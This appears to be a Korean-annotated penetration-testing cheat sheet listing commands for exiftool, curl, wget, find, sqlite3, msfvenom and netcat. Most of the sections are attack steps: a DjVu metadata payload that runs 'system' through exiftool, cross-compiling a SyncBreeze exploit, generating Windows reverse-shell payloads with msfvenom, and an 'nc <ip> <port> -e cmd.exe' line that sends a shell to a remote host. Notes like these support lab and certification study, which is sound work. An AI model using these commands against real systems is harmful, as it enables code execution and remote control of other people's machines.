# exiftool

```bash
exiftool -a -u brochure.pdf
```

- `exiftool` : 이미지/문서/영상 파일의 메타데이터를 조회·수정하는 도구  
- `-a` (*allow duplicates*) : 중복 키가 있어도 모두 표시  
- `-u` (*unknown*) : 표준에 없는(알 수 없는) 태그까지 표시  
- `brochure.pdf` : 대상 파일

## exiftool code execution
```bash
payload : (metadata "\c${system('id')};")
bzz payload payload.bzz
djvumake exploit.djvu INFO='1,1' BGjp=/dev/null ANTz=payload.bzz
file exploit.djvu
```
---

# 교차 컴파일

```bash
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
```

---
# curl
```bash
curl -L http://192.168.132.65
```

- `-L` : redirection

---
# wget
```bash
wget http://ip/test.txt -O /tmp/test.txt
```

- `-O` : 데이터 저장(대문자)

---
# find
```bash
find . -name '*config*' 2>/dev/null
```
---

# sqlite3
```bash
sqlite3 {dbname}
.tables
.headers on   # 컬럼 이름 출력
.mode column  # 표 형식으로 출력
select * from user;
.quit
```
---
# msfvenom
```bash
msfvenom -p windows/shell/reverse_tcp -f python
# 바이트 타입을 명시하기 위해서 b가 붙여서 나옴.

msfvenom -p windows/shell/reverse_tcp -f c
# 바이트 타입 명시 필요 없어서 b가 안붙여서 나옴.
```
# nc
```powershell
nc <ip> <port> -e cmd.exe
```
